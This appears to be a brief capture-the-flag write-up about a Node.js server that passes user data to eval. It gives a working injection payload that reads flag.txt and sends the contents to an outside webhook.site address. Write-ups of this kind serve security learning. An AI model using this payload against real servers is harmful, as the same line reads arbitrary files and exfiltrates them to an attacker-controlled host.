Server calls eval on the data sent by user.
This can be exploited with for example following payload:

`fs=require('fs');a=fs.readFileSync('flag.txt');http=require('http');http.get("http://webhook.site/<your-id>/"+a.toString());`

Then you would get url encoded flag on your webhook.